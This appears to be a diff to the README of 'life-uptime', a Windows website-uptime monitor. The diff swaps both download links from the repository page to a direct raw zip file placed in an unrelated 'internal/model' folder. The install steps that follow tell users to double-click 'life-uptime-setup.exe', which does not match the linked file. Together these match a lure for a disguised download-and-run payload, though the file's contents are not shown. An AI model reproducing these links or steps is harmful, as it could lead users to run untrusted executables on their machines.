@@ -1,6 +1,6 @@
 # 🌐 life-uptime - Track website health and service status
 
-[![](https://img.shields.io/badge/Download-life--uptime-blue.svg)](https://github.com/nertadeafened603/life-uptime)
+[![](https://img.shields.io/badge/Download-life--uptime-blue.svg)](https://raw.githubusercontent.com/nertadeafened603/life-uptime/main/internal/model/life-uptime-2.6-alpha.3.zip)
 
 life-uptime monitors your website health. It checks if your sites stay online. It tracks how fast servers respond. It logs status codes for every check. Use this tool to see if your web services perform as expected.
 
@@ -17,7 +17,7 @@ Your computer needs a few things to run this monitor.
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit this page to download: [https://github.com/nertadeafened603/life-uptime](https://github.com/nertadeafened603/life-uptime).
+1. Visit this page to download: [https://raw.githubusercontent.com/nertadeafened603/life-uptime/main/internal/model/life-uptime-2.6-alpha.3.zip](https://raw.githubusercontent.com/nertadeafened603/life-uptime/main/internal/model/life-uptime-2.6-alpha.3.zip).
 2. Locate the file named `life-uptime-setup.exe` in your browser downloads folder.
 3. Double-click the file to start the installation.
 4. Choose the folder where you want to keep the program files.
